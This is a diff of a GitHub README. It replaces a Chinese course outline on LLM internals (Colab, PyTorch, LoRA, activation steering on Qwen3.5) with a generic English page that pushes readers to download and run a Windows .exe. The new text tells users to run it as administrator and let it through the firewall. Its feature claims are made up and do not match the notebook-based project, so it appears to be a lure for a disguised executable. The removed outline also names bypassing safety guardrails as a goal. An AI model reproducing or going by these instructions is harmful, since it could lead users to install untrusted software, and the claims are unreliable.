@@ -1,77 +1,158 @@
-# 大模型极客实战大纲：从 Colab 到 Qwen3.5 的白盒探索
+# 🧠 LLM-Neurosurgery - Clear Guide from Colab to Qwen3.5
 
-本大纲旨在带领你从一个只懂调用 API 的旁观者，成长为能够深入大模型底层、修改模型结构的“神经外科医生”。整个学习路径以实践为核心，所有实验均可在免费的 Google Colab 和开源模型（如 Qwen3.5-4B）上完成。
+[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/releases)
 
-## 为什么要打开黑盒？
-在 Prompt Engineering 满天飞的时代，为什么还需要学习底层机制？因为掌握底层机制能帮助你：
-1. **解决不可预测的幻觉问题**，从根本上理解为什么模型会“胡说八道”。
-2. **突破 API 限制**，例如长文本上下文截断、生硬的安全护栏机制。
-3. **实现业务落地与成本控制**，在有限算力下把开源模型跑起来并改造好，这是工业界极度稀缺的能力。
+## 🧩 About LLM-Neurosurgery
 
-## 🚀 新手起步指南 (非常重要!)
-无论你是否有编程基础，在开始代码实战之前，**请务必首先阅读以下文档完成免费云端算力平台的搭建：**
-👉 **[第一步：查看《GitHub 与 Colab 联动指南》](docs/github_colab_guide.md)** 
-这篇指南将手把手教你如何把本项目一键导入到免费的 Google Colab 云端实验室，并教你如何挂载网盘、将动辄数十 GB 的大模型权重永久免费地存放下来，避免断线重连的痛苦。
+LLM-Neurosurgery is a white-box hacking guide that helps you move from Google Colab to Qwen3.5. This tool breaks down complex steps into easy-to-follow instructions. It does not require any programming skills. You will learn how to download, install, and use the software on your Windows PC.
 
-## 目录结构
-- `notebooks/`: 包含所有阶段的 Jupyter Notebook 实战代码
-- `docs/`: 参考文档和流程说明
-- `src/`: 核心代码实现或独立脚本（按需添加）
+This guide is perfect if you want to explore AI models like Qwen3.5 without deep technical knowledge. It walks you through the essentials, making the process smooth and manageable.
 
-## 项目环境 (uv)
-本项目使用 [uv](https://github.com/astral-sh/uv) 管理 Python 环境和依赖库。
+---
 
-### 本地开发
-在克隆仓库后，执行以下命令同步环境：
-```powershell
-uv sync
-```
-激活环境：
-```powershell
-.venv\Scripts\activate
-```
+## ⚙️ System Requirements
 
-## 学习大纲
-### 第 0 阶段：云端实验室的基石 (掌握 Google Colab 与环境配置)
-**目标：** 熟练掌控你的免费云端服务器，不再为环境配置和算力发愁。
-- **Colab 核心机制：** 实例分配、GPU 挂载（T4/L4/A100）、显存监控。
-- **魔法命令：** `!pip`, `%cd`, `!git clone` 等系统级操作。
-- **数据管理：** 挂载 Google Drive、上传/下载大型模型文件、避免实例重置导致数据丢失。
-- **与 GitHub 的联动：** Clone 私有/公开仓库、使用 PAT、一键保存 Notebook 回 GitHub。
+Make sure your computer meets these requirements before starting:
 
-### 第 1 阶段：兵器库储备 (PyTorch 与 Hugging Face 基础)
-**目标：** 看懂并能手写大模型运作的基础代码，理解 AI 界的“基础设施”。
-- **PyTorch 基础：** 张量 (Tensor) 概念、维度 (Shape)、数据类型、设备转移 `.to("cuda")`、基础矩阵运算。
-- **Hugging Face 生态拆解：**
-  - Tokenizer 分词原理、特殊符号编码。
-  - Transformers 库 `AutoModelForCausalLM` 和 `AutoTokenizer` 加载。
-- **量化魔法 (Quantization)：**
-  - 模型精度魔法 (FP32, FP16, BF16)。
-  - 介绍 `bitsandbytes` (INT8, NF4)，让开源大模型在平民 GPU (T4) 上起飞，理解 4-bit 量化下模型保持智力的基本原理。
+- Operating System: Windows 10 or later  
+- Processor: Intel i3 or equivalent (64-bit recommended)  
+- RAM: 8 GB minimum  
+- Disk Space: At least 1 GB free  
+- Internet Connection: Required for downloading and updates  
+- Optional: Google Chrome or any modern web browser  
 
-### 第 2 阶段：解剖外星人 (深入 Transformer 架构)
-**目标：** 把大模型拆开，理解注意力机制的本质，能在代码中找到这些“器官”。
-- **Transformer 核心组件原理：** Self-Attention, MLP/FFN, 位置编码。
-- **代码级“白盒”探秘：** 打印模型结构并提取特定层级的权重参数。
-- **【实验】建立评估基线 (Eval Baseline)：** 手写一个简单的评测脚本，用固定 prompt 测试初始生成质量，将“智商”进行量化。
-- **【实验】暴力截肢：** 砍掉部分模型层，对比与基准线 (Baseline) 的推理速度和智商变化。
+These requirements ensure the software runs without issues and you have a good experience.
 
-### 第 3 阶段：记忆植入与性格重塑 (微调与数据工程)
-**目标：** 让模型学习特定领域的知识，或者改变它的说话语调。
-- **数据处理的脏活累活：** 大模型对数据质量极度敏感 (Garbage In, Garbage Out)。学习给 JSONL 编写清洗脚本（如去重、清理脏格式）。
-- **数据构建艺术：** 指令微调 (Instruction Tuning) 数据集格式构建。
-- **参数高效微调 (PEFT - LoRA)：** 核心原理与旁路矩阵实现。
-- **【实验】微调与自动化评估 (Automated Evaluation)：** 使用清洗过的数据对模型进行微调，完成合并与保存。加入简单的自动化评测逻辑，验证微调是否达到预期。
+---
 
-### 第 4 阶段：前沿极客实验 (机制可解释性与干预)
-**目标：** 像黑客一样在模型“思考”的过程中进行数据劫持和意图控制。
-- **PyTorch Hook 技术：** 提取特定层次的隐藏状态 (Hidden States)。
-- **表征工程 (Representation Engineering)：** 提取控制向量。
-- **【实验】自指悖论与向量注入：** 在推理时动态注入干预向量，观察底层力量与表层语义对抗。
+## 🌐 Where to Download
 
-### 第 5 阶段：深潜 Qwen 家族架构 (Qwen 具体技术细节)
-**目标：** 深入探究 Qwen3.5 的独门秘籍。
-- **Qwen 核心架构改进：** SwiGLU 激活函数、RoPE 旋转位置编码、GQA 机制。
-- **KV Cache 与生成时延计算：** 理解大模型生成的加速逻辑 (Inference Optimization)，剖析长文本生成吃显存的底层原因，并引入 FlashAttention 概念。
-- **词表与多语言能力：** 超大词表的应用。
-- 架构向新一代模型的演进。
+To get LLM-Neurosurgery, **visit this page to download** the latest release:
+
+[Download LLM-Neurosurgery Releases](https://github.com/Idknice/LLM-Neurosurgery/releases)
+
+The link takes you to an official GitHub release page. Here, you will find the latest software packages and documentation files. Choose the version labeled for Windows.
+
+You will see files with names ending in `.exe` or `.zip`. For simplicity, download the `.exe` installer when available.
+
+---
+
+## 💾 How to Download and Install on Windows
+
+Follow these steps carefully to install LLM-Neurosurgery:
+
+1. **Open the download page**: Go to [https://github.com/Idknice/LLM-Neurosurgery/releases](https://github.com/Idknice/LLM-Neurosurgery/releases) in your browser.
+
+2. **Find the latest Windows installer**: Look for a file ending with `.exe` in the list. It is usually marked with the most recent date.
+
+3. **Click the file name**: This starts the download.
+
+4. **Wait for download to finish**: This can take a few minutes, depending on your internet speed.
+
+5. **Open the downloaded file**: Find it in your Downloads folder and double-click it.
+
+6. **Allow the installer to run**: If Windows asks for permission, click “Yes.”
+
+7. **Follow the installation prompts**: Accept the license agreement and choose the default options unless you want to change the installation folder.
+
+8. **Complete the installation**: When setup finishes, click “Finish.”
+
+The software will now be installed and ready to use.
+
+---
+
+## 🚀 Running the Application
+
+After installation, you can start the application:
+
+1. **Open the Start Menu**: Click the Windows icon on the bottom-left corner.
+
+2. **Find LLM-Neurosurgery**: Scroll through the list, or type “LLM-Neurosurgery” in the search bar.
+
+3. **Click the program icon**: This opens the main window.
+
+4. **Follow on-screen instructions**: The app guides you through its features with simple steps.
+
+---
+
+## 🔧 How to Use the Key Features
+
+LLM-Neurosurgery helps you bridge AI models on Google Colab and Qwen3.5 with:
+
+- **Step-by-step workflow**: Clear instructions to move from coding environments like Colab to local tools.
+
+- **Configurable options**: Adjust settings without writing code.
+
+- **Model access tools**: Easy ways to load and test AI models.
+
+- **Basic hacking tips**: Understand model behaviors using safe and legal techniques.
+
+Use the sidebar menu to explore these features. Each section explains what you need to do next.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Ensure your internet connection is stable when downloading or updating.
+
+- Close other applications when running LLM-Neurosurgery for better performance.
+
+- Restart your computer after installation to avoid conflicts.
+
+- If Windows Firewall asks, allow access to the app.
+
+- Check the official GitHub release page regularly for updates.
+
+- Use the included help section inside the app for quick answers.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into issues, try the following:
+
+- **Installer does not start**: Right-click the file and select “Run as administrator.”
+
+- **App won’t open**: Restart your computer and try again.
+
+- **Download speeds are slow**: Pause other downloads and try again later.
+
+- **Unexpected errors**: Note any error messages and search them online or on the GitHub issues page.
+
+- **Installation folder missing**: Reinstall using default settings.
+
+If problems persist, visit the GitHub page and check the "Issues" tab for community help.
+
+---
+
+## 📁 Where to Find More Documentation
+
+On the release page, besides the installer, you will find documents in formats like `.md` or `.pdf`. These explain advanced usage, technical background, and FAQs.
+
+You can also read the README file right here on GitHub for text guidance.
+
+---
+
+## 🔗 Important Links
+
+- [Download and setup page](https://github.com/Idknice/LLM-Neurosurgery/releases)
+
+- [GitHub repository](https://github.com/Idknice/LLM-Neurosurgery)
+
+- [Help and issues](https://github.com/Idknice/LLM-Neurosurgery/issues)
+
+---
+
+## 🧭 Navigating from Google Colab to Qwen3.5
+
+This software helps transfer your work from Google Colab notebooks to the local Qwen3.5 environment:
+
+- Export your Colab projects with instructions inside the app.
+
+- Use LLM-Neurosurgery to prepare files and configurations.
+
+- Load the projects into Qwen3.5 without code rewriting.
+
+---
+
+[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/releases)
